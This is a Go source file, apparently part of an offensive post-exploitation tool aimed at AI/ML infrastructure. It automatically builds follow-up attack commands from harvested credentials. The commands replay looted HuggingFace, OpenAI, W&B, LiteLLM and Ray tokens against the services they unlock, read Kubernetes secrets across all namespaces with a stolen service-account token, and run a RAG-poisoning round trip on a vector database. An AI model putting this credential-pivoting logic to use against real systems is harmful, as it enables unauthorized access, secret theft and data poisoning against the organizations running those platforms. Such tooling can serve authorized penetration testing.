package credchain

import (
	"fmt"
	"sort"
	"strings"
)

// ChainAction represents an automatically generated follow-up command
// to execute with a discovered credential.
type ChainAction struct {
	CredentialType string
	TargetURL      string
	Command        string
	Description    string
}

// GenerateChainActions produces follow-up commands for discovered credentials.
// Each action is a CLI command string that can be executed to use the credential
// against the target where it was found or against related services.
func GenerateChainActions(store *Store) []ChainAction {
	if store == nil || store.TotalCredentials() == 0 {
		return nil
	}

	var actions []ChainAction
	for hostPort, creds := range store.All() {
		// When MLflow Basic-auth credentials exist for this target, the
		// unauthenticated mlflow-url actions would 401 against the gated gateway —
		// prefer the authenticated path and drop the dead unauth suggestions.
		hasMLflowAuth := false
		for _, c := range creds {
			if c.Type == "mlflow-basic-auth" {
				hasMLflowAuth = true
				break
			}
		}
		for _, cred := range creds {
			if cred.Type == "mlflow-url" && hasMLflowAuth {
				continue
			}
			actions = append(actions, actionsForCredential(hostPort, cred)...)
		}
	}
	actions = append(actions, hfReplayActions(store)...)
	actions = append(actions, ragVerifyChainActions(store)...)
	return actions
}

// hfReplayActions routes every looted hf-token to every separately-discovered HF/TGI
// inference endpoint, producing the runnable `huggingface … generate` replay that completes
// the credential chain's final hop. A bare token found in (say) an MLflow run has no target
// of its own — this is where "the tool recommends the service the key goes to" happens. With
// no discovered HF endpoint, no action is emitted and the token stays viewer-only.
func hfReplayActions(store *Store) []ChainAction {
	endpoints := store.HFInferenceTargets()
	if len(endpoints) == 0 {
		return nil
	}
	seen := map[string]bool{}
	var tokens []string
	for _, creds := range store.All() {
		for _, c := range creds {
			if c.Type != "hf-token" || seen[c.Value] {
				continue
			}
			seen[c.Value] = true
			tokens = append(tokens, c.Value)
		}
	}
	if len(tokens) == 0 {
		return nil
	}
	sort.Strings(tokens)
	var actions []ChainAction
	for _, ep := range endpoints {
		epURL := ensureScheme(ep)
		// A TEI endpoint serves embeddings, not text generation — `/generate` 404s there, so the
		// runnable replay is `embed`. Every other kind (tgi, or unknown "hf") gets `generate`.
		isTEI := store.HFTargetKind(ep) == "tei"
		for _, token := range tokens {
			actions = append(actions, ChainAction{
				CredentialType: "hf-token",
				TargetURL:      epURL,
				Command:        fmt.Sprintf(`huggingface --target %s --header "Authorization: Bearer %s" enum`, epURL, token),
				Description:    "Enumerate the served model on the discovered HuggingFace endpoint with the looted token",
			})
			if isTEI {
				actions = append(actions, ChainAction{
					CredentialType: "hf-token",
					TargetURL:      epURL,
					Command:        fmt.Sprintf(`huggingface --target %s --header "Authorization: Bearer %s" embed --inputs "incident response playbook" --force-exploit`, epURL, token),
					Description:    "Replay the looted token against the discovered TEI embeddings endpoint (it serves /embed, not /generate)",
				})
				continue
			}
			actions = append(actions, ChainAction{
				CredentialType: "hf-token",
				TargetURL:      epURL,
				Command:        fmt.Sprintf(`huggingface --target %s --header "Authorization: Bearer %s" generate --prompt "incident response playbook" --force-exploit`, epURL, token),
				Description:    "Replay the looted HuggingFace token against the discovered TGI gateway for REAL inference",
			})
		}
	}
	return actions
}

func actionsForCredential(hostPort string, cred Credential) []ChainAction {
	// A credential looted from a LOCAL file (target is a filesystem path, not host:port) has
	// no network endpoint to pivot to. Emit no follow-on command — the credential stays
	// viewer-only — instead of a bogus "openai-compat --target http:///tmp/…/.env" that can't
	// run. A real network host:port never contains a path separator.
	if strings.TrimSpace(hostPort) == "" || strings.Contains(hostPort, "/") {
		return nil
	}
	targetURL := ensureScheme(hostPort)

	switch cred.Type {
	case "jupyter-token":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf("jupyter --target %s --token %s enum", targetURL, cred.Value),
				Description:    "Enumerate Jupyter server with discovered token",
			},
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf("jupyter --target %s --token %s notebooks", targetURL, cred.Value),
				Description:    "List notebooks with discovered token",
			},
		}
	case "openai-api-key":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf("openai-compat --target %s --api-key %s auth-sweep", targetURL, cred.Value),
				Description:    "Validate OpenAI API key against endpoint",
			},
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf("openai-compat --target %s --api-key %s enum", targetURL, cred.Value),
				Description:    "Enumerate models with discovered API key",
			},
		}
	case "anthropic-api-key":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf("openai-compat --target %s --api-key %s auth-sweep", targetURL, cred.Value),
				Description:    "Validate Anthropic key against OpenAI-compatible endpoint",
			},
		}
	case "hf-token":
		// A bare hf-token has no target of its own, so it produces NO per-credential action
		// here. The replay is generated centrally in GenerateChainActions, routed to a
		// separately-discovered HF/TGI endpoint (hfReplayActions). Without a discovered
		// endpoint the token stays viewer-only — honest: there is nowhere to replay it.
		return nil
	case "mlflow-run-id":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf("mlflow --target %s artifacts --run-id %s", targetURL, cred.Value),
				Description:    "Inspect artifact tree for MLflow run discovered in findings",
			},
		}
	case "mlflow-url":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf("mlflow --target %s enum", targetURL),
				Description:    "Enumerate MLflow tracking server discovered in exposed runtime environment",
			},
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf("mlflow --target %s registry", targetURL),
				Description:    "Inspect MLflow registry after runtime environment disclosed tracking URL",
			},
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf("mlflow --target %s runs", targetURL),
				Description:    "List MLflow runs after runtime environment disclosed tracking URL",
			},
		}
	case "mlflow-basic-auth":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf(`mlflow --target %s --header "Authorization: Basic %s" enum`, targetURL, cred.Value),
				Description:    "Enumerate MLflow tracking server with Basic Auth credential discovered in runtime environment",
			},
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf(`mlflow --target %s --header "Authorization: Basic %s" runs --limit 20`, targetURL, cred.Value),
				Description:    "List MLflow runs with Basic Auth credential discovered in runtime environment",
			},
		}
	case "bearer-token":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf(`openai-compat --target %s --header "Authorization: Bearer %s" auth-sweep`, targetURL, cred.Value),
				Description:    "Validate bearer token against endpoint",
			},
		}
	case "api-key":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf("openai-compat --target %s --api-key %s auth-sweep", targetURL, cred.Value),
				Description:    "Validate discovered API key against endpoint",
			},
		}
	case "wandb-api-key":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf(`wandb --target %s --header "Authorization: Bearer %s" enum`, targetURL, cred.Value),
				Description:    "Enumerate W&B server with discovered API key",
			},
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf(`wandb --target %s --header "Authorization: Bearer %s" secrets --entity <entity> --project <project>`, targetURL, cred.Value),
				Description:    "Scan a known W&B entity/project for embedded secrets with discovered API key",
			},
		}
	case "wandb-secrets-found":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf("wandb --target %s secrets --entity <entity> --project <project> --limit 50", targetURL),
				Description:    "Re-run W&B secret extraction for a known entity/project",
			},
		}
	case "litellm-master-key":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf(`litellm --target %s --header "Authorization: Bearer %s" proxy-chain --relay-test`, targetURL, cred.Value),
				Description:    "Prove real inference through the LiteLLM proxy with the discovered master key (coherence-scored payoff)",
			},
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf(`litellm --target %s --header "Authorization: Bearer %s" enum`, targetURL, cred.Value),
				Description:    "Enumerate LiteLLM proxy with discovered master key",
			},
		}
	case "ray-dashboard-token":
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf(`ray --target %s --header "Authorization: Bearer %s" enum`, targetURL, cred.Value),
				Description:    "Enumerate Ray cluster with discovered dashboard token",
			},
			{
				CredentialType: cred.Type,
				TargetURL:      targetURL,
				Command:        fmt.Sprintf(`ray --target %s --header "Authorization: Bearer %s" jobs`, targetURL, cred.Value),
				Description:    "List Ray jobs with discovered dashboard token",
			},
		}
	case "k8s-sa-token":
		// The kube-apiserver is always TLS; force https regardless of how the host:port was recorded.
		apiURL := "https://" + strings.TrimPrefix(strings.TrimPrefix(targetURL, "https://"), "http://")
		// Inline the full (unredacted) token in each command so every Next Action is a
		// single, directly-runnable `aipostex k8s …` command. (An `export TOKEN=…` line
		// can't live here: recommendations render with an `aipostex ` prefix, so it would
		// print the non-runnable `aipostex export …`.)
		return []ChainAction{
			{
				CredentialType: cred.Type,
				TargetURL:      apiURL,
				Command:        fmt.Sprintf(`k8s --target %s --insecure --header "Authorization: Bearer %s" access-review`, apiURL, cred.Value),
				Description:    "Map the stolen service-account's privileges (SelfSubjectRulesReview)",
			},
			{
				CredentialType: cred.Type,
				TargetURL:      apiURL,
				Command:        fmt.Sprintf(`k8s --target %s --insecure --header "Authorization: Bearer %s" secret-read --all-namespaces --force-exploit`, apiURL, cred.Value),
				Description:    "Read secrets across all namespaces with the stolen service-account token",
			},
		}
	default:
		return nil
	}
}

// IsChainableType reports whether autochain can generate a follow-on command for a
// credential of this type — i.e. whether it belongs under "Actionable Pivots" rather
// than "Viewer-Only Secrets". Derived from actionsForCredential so the two never drift.
func IsChainableType(credType string) bool {
	return len(actionsForCredential("host:0", Credential{Type: credType})) > 0
}

func ensureScheme(hostPort string) string {
	if strings.HasPrefix(hostPort, "http://") || strings.HasPrefix(hostPort, "https://") {
		return hostPort
	}
	return "http://" + hostPort
}

// ragVerifyChainActions suggests a rag-verify command when both a vectordb
// credential and an LLM credential are discovered across any targets.
func ragVerifyChainActions(store *Store) []ChainAction {
	var vdbTarget, llmTarget, llmKey string
	for hostPort, creds := range store.All() {
		for _, c := range creds {
			switch c.Type {
			case "wandb-secrets-found":
				// not a vectordb credential
			default:
				// look for vectordb-related targets
			}
			switch {
			case c.Type == "api-key" && vdbTarget == "":
				vdbTarget = ensureScheme(hostPort)
			case c.Type == "openai-api-key":
				llmTarget = ensureScheme(hostPort)
				llmKey = c.Value
			}
		}
	}
	if llmTarget == "" || llmKey == "" {
		return nil
	}
	// Only suggest rag-verify against a vectordb target we actually discovered.
	// Fabricating a <vectordb-target> produces a command pointed at nothing —
	// that is the leak that surfaced in the loot Commands list. When a concrete
	// vectordb key was looted we still emit it with a <collection> detail slot to
	// fill (same intentional pattern as the wandb secrets action), but we never
	// invent the target itself.
	if vdbTarget == "" {
		return nil
	}
	return []ChainAction{
		{
			CredentialType: "rag-verify-chain",
			TargetURL:      vdbTarget,
			Command:        fmt.Sprintf("vectordb --target %s --type chromadb rag-verify --collection <collection> --llm-target %s --force-exploit", vdbTarget, llmTarget),
			Description:    "Prove RAG poisoning round-trip: inject canary into vectordb and verify retrieval via LLM",
		},
	}
}
